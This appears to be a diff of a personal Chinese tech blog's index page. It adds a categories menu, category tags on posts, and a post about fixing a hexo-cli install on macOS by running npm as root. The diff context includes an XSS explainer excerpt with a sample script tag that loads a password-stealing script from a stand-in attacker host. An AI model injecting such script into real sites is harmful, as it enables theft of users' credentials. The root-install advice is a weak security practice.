@@ -218,6 +218,16 @@
         </li>
       
         
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
@@ -284,6 +294,166 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/06/22/hexo-installation-error-on-mac/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Amosannn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Amosannn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/06/22/hexo-installation-error-on-mac/" itemprop="url">mac下的hexo安装出现异常</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T18:16:59+08:00">
+                2017-06-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
+                    <span itemprop="name">技术一路走到黑</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/06/22/hexo-installation-error-on-mac/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/06/22/hexo-installation-error-on-mac/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>将hexo从win迁移到mac时发生了安装错误。</p>
+<p>没有保留报错截图，就从日志文件中截取了关键段落。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">5751 error code ELIFECYCLE</div><div class="line">5752 error errno 1</div><div class="line">5753 error hexo-util@0.6.0 postinstall: `npm run build:highlight`</div><div class="line">5753 error Exit status 1</div><div class="line">5754 error Failed at the hexo-util@0.6.0 postinstall script.</div><div class="line">5754 error This is probably not a problem with npm. There is likely additional logging output above.</div><div class="line">5755 verbose exit [ 1, true ]</div></pre></td></tr></table></figure>
+<p>按照网上的几种解法都没能完成安装</p>
+<blockquote>
+<p>sudo npm install -g hexo-cli</p>
+<p>sudo npm install hexo –no-optional</p>
+<p>sudo npm install -g hexo-cli –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="external">https://registry.npm.taobao.org</a></p>
+</blockquote>
+<p>最后尝试进入root权限中执行npm命令，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line">npm install -g hexo-cli</div></pre></td></tr></table></figure>
+<p>安装成功。<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/06/22/hexo-installation-error-on-mac/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
     
       
 
@@ -463,6 +633,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
+                    <span itemprop="name">技术一路走到黑</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -594,6 +786,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
+                    <span itemprop="name">技术一路走到黑</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -631,7 +845,7 @@
       
         
           <p>今天碰到获取时间中月份和日期的需求，立马去翻jdk，发现<code>util.Date类</code>中的获取方法竟然在jdk1.1就过期了…<br>于是按着jdk中推荐的<code>Calendar类</code>摸过去，找到方法。但是不知道为什么Date里的get方法不推荐了，找机会一定要瞅一瞅源码(ง๑ •̀_•́)ง</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</div><div class="line"> 使用Calendar实现时间拆解</div><div class="line">/*</div><div class="line">public void getTimeByCalendar()&#123;</div><div class="line">	Calendar cal = Calendar.getInstance();</div><div class="line">	cal.setTime(new Date());//  传入Date对象即可</div><div class="line">	int year = cal.get(Calendar.YEAR);// 获取年份</div><div class="line">	int month=cal.get(Calendar.MONTH);// 获取月份</div><div class="line">	int day=cal.get(Calendar.DATE);// 获取日</div><div class="line">	int hour=cal.get(Calendar.HOUR);// 小时</div><div class="line">	int minute=cal.get(Calendar.MINUTE);// 分           </div><div class="line">	int second=cal.get(Calendar.SECOND);// 秒</div><div class="line">	int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 一周的第几天</div><div class="line">	System.out.println("现在的时间是：公元"+year+"年"+month+"月"+day+"日      "+hour+"时"+minute+"分"+second+"秒       星期"+dayOfWeek);</div><div class="line">&#125;</span></div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> 使用Calendar实现时间拆解</div><div class="line">/*</div><div class="line">public void getTimeByCalendar()&#123;</div><div class="line">	Calendar cal = Calendar.getInstance();</div><div class="line">	cal.setTime(new Date());//  传入Date对象即可</div><div class="line">	int year = cal.get(Calendar.YEAR);// 获取年份</div><div class="line">	int month=cal.get(Calendar.MONTH);// 获取月份</div><div class="line">	int day=cal.get(Calendar.DATE);// 获取日</div><div class="line">	int hour=cal.get(Calendar.HOUR);// 小时</div><div class="line">	int minute=cal.get(Calendar.MINUTE);// 分           </div><div class="line">	int second=cal.get(Calendar.SECOND);// 秒</div><div class="line">	int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 一周的第几天</div><div class="line">	System.out.println("现在的时间是：公元"+year+"年"+month+"月"+day+"日      "+hour+"时"+minute+"分"+second+"秒       星期"+dayOfWeek);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>翻jdk的同时还发现另一种拆分时间的方法，但是没有<code>Calendar</code>自由。<br>
           <!--noindex-->
           <div class="post-button text-center">
@@ -723,6 +937,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
+                    <span itemprop="name">技术一路走到黑</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -760,7 +996,7 @@
       
         
           <h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
-<p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">wiki</a>里写的很清楚。</p>
+<p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="external">wiki</a>里写的很清楚。</p>
 <h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=<span class="string">"www.hackyou.com/getallpassword.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>惊不惊喜？<br>
@@ -853,6 +1089,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
+                    <span itemprop="name">技术一路走到黑</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -983,6 +1241,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
+                    <span itemprop="name">技术一路走到黑</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -1358,12 +1638,21 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
           
 
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
           
 
           
@@ -1371,7 +1660,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-count">13</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
